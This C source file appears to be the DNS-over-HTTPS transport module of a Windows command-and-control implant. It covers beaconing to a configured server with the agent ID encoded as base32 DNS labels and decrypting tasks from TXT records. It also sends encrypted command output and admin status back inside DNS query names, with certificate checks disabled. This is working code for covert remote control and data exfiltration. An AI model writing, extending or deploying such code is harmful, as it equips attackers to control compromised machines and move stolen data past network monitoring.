#include "transport_doh.h"
#include "transport.h"
#include "config.h"
#include "crypto.h"
#include "b64.h"
#include <windows.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define DOH_MAX_RESULT 3000
#define DOH_CHUNK 63

// ── Base32 uppercase (RFC 4648, no padding) ───────────────────────────────────

static const char B32U[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

static char* doh_b32_encode(const uint8_t *data, size_t len) {
    size_t out_cap = (len * 8 + 4) / 5 + 2;
    char *out = (char*)malloc(out_cap);
    if (!out) return NULL;
    size_t j = 0;
    uint64_t buf = 0; int bits = 0;
    for (size_t i = 0; i < len; i++) {
        buf = (buf << 8) | data[i]; bits += 8;
        while (bits >= 5) { bits -= 5; out[j++] = B32U[(buf >> bits) & 0x1f]; }
    }
    if (bits > 0) out[j++] = B32U[(buf << (5 - bits)) & 0x1f];
    out[j] = '\0';
    return out;
}

// Encode bytes as base32 and split into 63-char labels joined by dots.
static char* doh_encode(const uint8_t *data, size_t len) {
    char *b32 = doh_b32_encode(data, len);
    if (!b32) return NULL;
    size_t blen = strlen(b32);
    size_t out_cap = blen + blen / DOH_CHUNK + 2;
    char *out = (char*)malloc(out_cap);
    if (!out) { free(b32); return NULL; }
    size_t j = 0;
    for (size_t i = 0; i < blen; ) {
        size_t end = i + DOH_CHUNK;
        if (end > blen) end = blen;
        if (j > 0) out[j++] = '.';
        memcpy(out + j, b32 + i, end - i);
        j += end - i; i = end;
    }
    out[j] = '\0';
    free(b32);
    return out;
}

// ── URL encode (percent-encode non-safe chars including '.') ──────────────────

static char* url_encode(const char *s) {
    size_t n = strlen(s);
    char *out = (char*)malloc(n * 3 + 1);
    if (!out) return NULL;
    size_t j = 0;
    for (size_t i = 0; i < n; i++) {
        unsigned char c = (unsigned char)s[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '~') {
            out[j++] = c;
        } else {
            out[j++] = '%';
            out[j++] = "0123456789ABCDEF"[c >> 4];
            out[j++] = "0123456789ABCDEF"[c & 0xf];
        }
    }
    out[j] = '\0';
    return out;
}

// ── DNS wire TXT parser ───────────────────────────────────────────────────────

static uint8_t* parse_doh_txt(const uint8_t *data, size_t dlen, size_t *txt_len) {
    *txt_len = 0;
    if (dlen < 12) return NULL;
    int ancount = (int)(data[6]) << 8 | data[7];
    int qdcount = (int)(data[4]) << 8 | data[5];
    if (ancount == 0) return NULL;
    int pos = 12;
    for (int q = 0; q < qdcount && pos < (int)dlen; q++) {
        while (pos < (int)dlen) {
            if (data[pos] == 0) { pos++; break; }
            if ((data[pos] & 0xC0) == 0xC0) { pos += 2; break; }
            pos += (int)data[pos] + 1;
        }
        if (pos + 4 <= (int)dlen) pos += 4;
    }
    for (int i = 0; i < ancount && pos < (int)dlen; i++) {
        if ((data[pos] & 0xC0) == 0xC0) {
            pos += 2;
        } else {
            while (pos < (int)dlen) {
                if (data[pos] == 0) { pos++; break; }
                pos += (int)data[pos] + 1;
            }
        }
        if (pos + 10 > (int)dlen) break;
        int rtype = (int)(data[pos]) << 8 | data[pos+1];
        pos += 2; pos += 2; pos += 4;
        int rdlen = (int)(data[pos]) << 8 | data[pos+1]; pos += 2;
        if (rdlen == 0 || pos + rdlen > (int)dlen) break;
        const uint8_t *rdata = data + pos; pos += rdlen;
        if (rtype == 16) {
            uint8_t *txt = (uint8_t*)malloc(rdlen + 1);
            if (!txt) return NULL;
            size_t tlen = 0; int rpos = 0;
            while (rpos < rdlen) {
                int sl = (int)(uint8_t)rdata[rpos++];
                if (rpos + sl > rdlen) break;
                memcpy(txt + tlen, rdata + rpos, sl);
                tlen += sl; rpos += sl;
            }
            txt[tlen] = '\0';
            *txt_len = tlen;
            return txt;
        }
    }
    return NULL;
}

// ── WinHTTP GET with Accept: application/dns-message ─────────────────────────

#define DOH_SEC_FLAGS (SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE|\
    SECURITY_FLAG_IGNORE_CERT_CN_INVALID|SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)

static wchar_t* doh_to_wide(const char *s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t*)malloc(n * sizeof(wchar_t));
    if (w) MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

static uint8_t* doh_http_get(const char *path, size_t *resp_len, int *status) {
    *resp_len = 0; *status = 0;

    // Parse SERVER_URL to get host/port
    const char *url = AGENT_SERVER_URL;
    int is_https = 0; int port = 80;
    const char *rest = url;
    if (strncmp(url,"https://",8)==0){is_https=1;rest=url+8;port=443;}
    else if (strncmp(url,"http://",7)==0){rest=url+7;}
    char host[256]={0}; char base[512]={0};
    const char *slash = strchr(rest, '/');
    char hp[256]={0};
    if (slash){strncpy(hp,rest,slash-rest);strncpy(base,slash,sizeof(base)-1);}
    else{strncpy(hp,rest,sizeof(hp)-1);}
    char *colon=strrchr(hp,':');
    if(colon){*colon='\0';port=atoi(colon+1);}
    strncpy(host,hp,sizeof(host)-1);

    char full[2048]; snprintf(full,sizeof(full),"%s%s",base,path);
    wchar_t *wu=doh_to_wide(AGENT_USER_AGENT);
    wchar_t *wh=doh_to_wide(host);
    wchar_t *wp=doh_to_wide(full);
    uint8_t *buf = NULL;

    HINTERNET hS=WinHttpOpen(wu,WINHTTP_ACCESS_TYPE_NO_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);
    if(!hS) goto end;
    HINTERNET hC=WinHttpConnect(hS,wh,(INTERNET_PORT)port,0);
    if(!hC){WinHttpCloseHandle(hS);goto end;}
    DWORD fl=is_https?WINHTTP_FLAG_SECURE:0;
    HINTERNET hR=WinHttpOpenRequest(hC,L"GET",wp,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,fl);
    if(!hR){WinHttpCloseHandle(hC);WinHttpCloseHandle(hS);goto end;}
    if(is_https){DWORD sf=DOH_SEC_FLAGS;WinHttpSetOption(hR,WINHTTP_OPTION_SECURITY_FLAGS,&sf,sizeof(sf));}
    {const wchar_t *hdrs=L"Accept: application/dns-message\r\n";
     WinHttpAddRequestHeaders(hR,hdrs,(DWORD)wcslen(hdrs),WINHTTP_ADDREQ_FLAG_ADD);}
    if(!WinHttpSendRequest(hR,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0))
        {WinHttpCloseHandle(hR);WinHttpCloseHandle(hC);WinHttpCloseHandle(hS);goto end;}
    if(!WinHttpReceiveResponse(hR,NULL))
        {WinHttpCloseHandle(hR);WinHttpCloseHandle(hC);WinHttpCloseHandle(hS);goto end;}
    {DWORD code=0,csz=sizeof(code);
     WinHttpQueryHeaders(hR,WINHTTP_QUERY_STATUS_CODE|WINHTTP_QUERY_FLAG_NUMBER,
         WINHTTP_HEADER_NAME_BY_INDEX,&code,&csz,WINHTTP_NO_HEADER_INDEX);
     *status=(int)code;}
    {size_t cap=8192,len=0; buf=(uint8_t*)malloc(cap); DWORD got;
     while(buf&&WinHttpReadData(hR,buf+len,(DWORD)(cap-len),&got)&&got>0){
         len+=got;
         if(len+8192>cap){cap*=2;uint8_t *nb=(uint8_t*)realloc(buf,cap);if(!nb){free(buf);buf=NULL;break;}buf=nb;}
     }
     if(buf)*resp_len=len;}
    WinHttpCloseHandle(hR);WinHttpCloseHandle(hC);WinHttpCloseHandle(hS);
end: free(wu);free(wh);free(wp);
    return buf;
}

// ── Transport operations ──────────────────────────────────────────────────────

int transport_doh_register(void) {
    return agent_http_register();
}

AgentTask* transport_doh_beacon(int *count) {
    *count = 0;
    if (!g_agent.has_key) return NULL;

    char *agent_enc = doh_encode((const uint8_t*)g_agent.agent_id, strlen(g_agent.agent_id));
    if (!agent_enc) return NULL;
    char name[2048]; snprintf(name, sizeof(name), "b.%s", agent_enc);
    free(agent_enc);

    char *enc_name = url_encode(name);
    if (!enc_name) return NULL;

    char path[4096];
    snprintf(path, sizeof(path), "/dns-query?name=%s&type=TXT", enc_name);
    free(enc_name);

    size_t resp_len=0; int status=0;
    uint8_t *resp = doh_http_get(path, &resp_len, &status);
    if (!resp || status != 200 || resp_len == 0) { free(resp); return NULL; }

    size_t txt_len=0;
    uint8_t *raw_txt = parse_doh_txt(resp, resp_len, &txt_len);
    free(resp);
    if (!raw_txt || txt_len == 0) { free(raw_txt); return NULL; }

    raw_txt[txt_len] = '\0';
    size_t ct_len=0;
    uint8_t *ct = b64_decode((const char*)raw_txt, &ct_len);
    free(raw_txt);
    if (!ct) return NULL;

    size_t plain_len=0;
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, ct, ct_len, &plain_len);
    free(ct);
    if (!plain) return NULL;

    AgentTask *tasks = agent_parse_tasks(plain, plain_len, count);
    free(plain);
    return tasks;
}

void transport_doh_send_result(long long task_id, const char *output,
                                const char *error, int is_admin) {
    if (!g_agent.has_key) return;

    size_t body_sz = (output?strlen(output):0) + (error?strlen(error):0) + 128;
    char *body = (char*)malloc(body_sz);
    if (!body) return;
    snprintf(body, body_sz,
        "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
        task_id, output?output:"", error?error:"", is_admin?"true":"false");

    size_t enc_len=0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32, (const uint8_t*)body, strlen(body), &enc_len);
    free(body);
    if (!enc) return;

    if (enc_len <= DOH_MAX_RESULT) {
        char *enc_b64 = b64_encode(enc, enc_len);
        if (enc_b64) {
            char payload_json[8192];
            snprintf(payload_json, sizeof(payload_json),
                "{\"a\":\"%s\",\"d\":\"%s\"}", g_agent.agent_id, enc_b64);
            free(enc_b64);
            char *name_raw = doh_encode((const uint8_t*)payload_json, strlen(payload_json));
            if (name_raw) {
                char name_full[4096];
                snprintf(name_full, sizeof(name_full), "r.%s", name_raw);
                free(name_raw);
                char *enc_name = url_encode(name_full);
                if (enc_name) {
                    char path[4096];
                    snprintf(path, sizeof(path), "/dns-query?name=%s&type=TXT", enc_name);
                    free(enc_name);
                    size_t rl=0; int st=0;
                    uint8_t *r = doh_http_get(path, &rl, &st);
                    free(r);
                }
            }
        }
    } else {
        char path[256];
        snprintf(path, sizeof(path), "/result/%s", g_agent.agent_id);
        uint8_t *resp=NULL; size_t rl=0; int st=0;
        agent_http_do("POST", path, enc, enc_len, NULL, &resp, &rl, &st);
        free(resp);
    }
    free(enc);
}
